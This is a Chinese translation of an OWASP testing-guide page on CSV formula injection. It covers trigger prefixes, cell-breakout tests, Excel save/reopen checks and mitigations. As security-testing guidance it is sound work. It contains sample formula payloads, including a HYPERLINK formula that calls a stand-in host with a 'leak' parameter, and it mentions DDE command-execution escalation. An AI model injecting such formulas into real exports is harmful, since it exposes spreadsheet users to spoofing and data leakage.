# 测试CSV注入

|ID          |
|------------|
|WSTG-INPV-21|

## 概述

CSV注入（也称为公式注入）发生在应用程序将不受信任的、用户控制的输入嵌入到CSV（或其他电子表格兼容）导出中，并且当生成的电子表格在电子表格程序（如Microsoft Excel、LibreOffice Calc）中打开时。电子表格应用程序可能将某些单元格值解释为公式，可能导致安全问题，如用户欺骗（网络钓鱼式工作流）、电子表格输出操作或数据泄露。在某些环境中，公式注入可以通过电子表格"小工具"和遗留功能（如DDE/动态数据交换行为）升级到更高影响，可能达到打开文件的 workstation 上执行命令——这通常取决于客户端配置和/或用户交互。

此问题的关键特征是漏洞通常仅当导出文件由用户在电子表格应用程序中打开时（例行行管理员、财务或支持）才显现。

## 测试目标

- 识别包含不受信任输入的CSV/电子表格导出功能。
- 验证当导出在常用电子表格应用程序中打开时，攻击者控制的值是否被解释为公式。
- 检查分隔符/引号注入是否可以危险的prefix移到单元格开头。
- 验证缓解措施在Microsoft Excel保存和重新打开后是否保持有效。
- 根据谁打开导出以及如何使用它来评估实际影响。

## 如何测试

### 公式触发前缀

以下字符开头的单元格可能被电子表格软件解释为公式：

- 等号（`=`）
- 加号（`+`）
- 减号（`-`）
- At符号（`@`）
- Tab（`0x09`）
- 回车（`0x0D`）
- 换行（`0x0A`）
- 全角（双字节）变体，如`＝`、`＋`、`－`、`＠`（取决于区域设置/应用程序行为）

> 重要（Excel行为）：Microsoft Excel在保存文件并重新打开时可能会删除引号或从CSV单元格中删除转义字符。因此，某些常用建议的缓解措施可能在保存/重新打开后失败，并且先前转义的公式可能再次激活。

还要注意，仅确保*整体*不受信任输入不以危险字符开头是不够的。攻击者可以注入分隔符和引号以开始新单元格，将危险字符放在单元格开头。

### 识别CSV导出功能和数据源

找到生成CSV/TSV或"导出到电子表格"内容的功能：

- 报告（用户、交易、审计日志、票据）
- 导出列表的管理员仪表板
- 应用程序生成的电子邮件附件
- 计划的导出/集成

识别可进入导出的不受信任数据源：

- 用户个人资料（姓名、电子邮件、公司）
- 自由文本字段（评论、票据主题、备注）
- 导入/集成的外部数据（webhook、CRM同步、合作伙伴提要）

记录哪些角色可以触发导出，哪些角色可能打开它。

### 在候选字段中放置良性的、可检测的类公式值

使用无害有效载荷检测公式评估（避免执行命令或执行不受控网络访问的有效载荷）。
测试以每个公式触发字符开头的值：

- `=1+1`
- `+1+1`
- `-1+1`
- `@SUM(1, 1)`
- `=HYPERLINK("http://example.invalid/leak?test=1", "Click Me")`

注：

- `HYPERLINK()`案例有助于展示现实影响（欺骗/网络钓鱼式流程，或者链接点击/打开时可能的元数据泄露）。在测试期间使用受控端点（例如本地监听器或内部测试主机）。
- 不要在验证中使用外部"真实攻击者"基础设施。

还测试控制字符和Unicode变体（输入处理允许时）：

- 以Tab字符后跟`=1+1`（Tab + `=1+1`）开头的值
- 全角前缀变体（例如`＝1+1`）

### 测试分隔符和引号"单元格突破"场景

因为CSV是基于单元格的，测试是否可以注入开始新单元格的内容，然后以危险字符开头。这取决于：

- 字段分隔符（通常`,`或`;`）
- 引号规则和转义
- 应用程序端CSV生成和编码

示例*良性*测试模式（调整分隔符为实际导出格式）：

- 包含引号和分隔符的值，意图创建新单元格，然后`=1+1`
- 如果导出器未将其引起来，则直接包含分隔符的值，然后`=1+1`

目标是查看结果CSV是否包含任何单元格，其第一个字符是公式触发前缀之一。通过在文本编辑器中检查原始CSV来验证。

### 在电子表格应用程序中导出和验证

- 导出/下载CSV。
- 在目标环境中使用的至少一个电子表格应用程序中打开它（Excel和/或LibreOffice等）。
- 确认单元格是否被解释为公式：
  - 电子表格显示计算结果（如`2`）而不是文字字符串（如`=1+1`），和/或
  - 公式栏显示公式而不是纯文本。

记录：

- 应用程序名称/版本（如Microsoft Excel）
- 打开文件的方式（双击vs导入向导）
- 区域设置是否影响解析

### Excel保存/重新打开回归测试（缓解可靠性）

如果应用程序声称转义/引号值：

- 在Microsoft Excel中打开导出的CSV。
- 保存文件（如CSV）。
- 关闭并重新打开。
- 重新检查先前"中和"的值是否变为活动公式。

此步骤很关键，因为Excel可能会在保存/重新打开后规范化/删除某些转义/引号行为。

### 评估影响

根据以下因素评估实际风险：

- 谁打开文件（特权角色vs最终用户）
- 导出是否外部共享
- 是否依赖电子表格值进行决策（如总计、标志、状态）
- 公式是否可能误导用户或触发您环境中的电子表格行为

提供明确的复现路径：

1. 输入在哪里输入
2. 导出如何生成
3. 哪个程序将其解释为公式
4. 发生评估的证据（截图或描述）

### 更高影响验证（可选，严格控制）

某些现实案例显示公式注入超出简单计算/欺骗的升级（例如通过DDE等遗留电子表格功能）。此行为高度依赖环境。

## 修复

没有一种通用的CSV清理策略对所有电子表格应用程序和下游消费者都安全。对于旨在在电子表格软件中供人查看的CSV，请应用深度防御方法：

- 确保没有单元格以公式触发字符（`=`、`+`、`-`、`@`）和相关控制/Unicode变体开头。
- 考虑每字段清理（常用建议）：
  - 用双引号包围每个单元格
  - 在每个单元格前加上单引号
  - 双引号转义  
  注意：这在Microsoft Excel中保存和重新打开后可能不可靠。

- Excel抗变异缓解（观察到的行为）：
  - 如果单元格以`=`、`+`、`-`或`@`开头，在引号字段内用制表符（`0x09`）作为前缀（例如`"\t=1+1"`）。
  权衡：制表符成为底层数据的一部分，可能影响下游程序导入。

始终根据范围内的电子表格应用程序和工作流验证所选缓解措施。

## 工具

- 拦截代理（如Burp Suite、ZAP）注入受控值并重现确切的导出工作流。
- 用于在隔离环境中验证的电子表格软件（如Microsoft Excel、LibreOffice Calc）。
- 安全HTTP监听器（本地或内部测试主机）在验证`HYPERLINK()`行为时观察点击/请求。
- 文本编辑器检查原始CSV并确认是否有任何单元格以公式触发前缀开头。
